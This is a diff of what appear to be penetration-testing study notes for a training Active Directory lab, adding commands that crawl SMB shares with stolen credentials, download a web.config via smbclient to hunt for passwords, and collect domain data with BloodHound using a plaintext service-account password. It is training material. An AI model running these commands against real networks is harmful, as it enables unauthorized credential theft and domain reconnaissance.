@@ -175,7 +175,12 @@ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share '
 netexec smb 172.16.6.0/24 -u svc_sql -p "lucky7" -M spider_plus 
 
 # check OUTPUT(lists file names)
- head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
+ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json # find IT/Private/Development/web.config file
+ 
+# download the file to exam 
+smbclient //172.16.7.3/Department\ Shares -U 'BR086@INLANEFREIGHT.LOCAL%Welcome1' -c 'cd IT; cd Private; cd Development; get web.config; bye'
+
+ 
 ```
 >We could dig around for interesting files such as `web.config` files or scripts that may contain passwords
 
@@ -302,6 +307,8 @@ ls
 # 20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
 zip -r ilfreight_bh.zip *.json # creat full zip file
 
+# or auto zip 
+bloodhound-ce-python -c All -ns 172.16.7.3 -d INLANEFREIGHT.LOCAL -u 'mssqlsvc@INLANEFREIGHT.LOCAL' -p 'Sup3rS3cur3maY5ql$3rverE' --zip
 ```
 #### Upload the Zip File into the BloodHound GUI
 ```bash
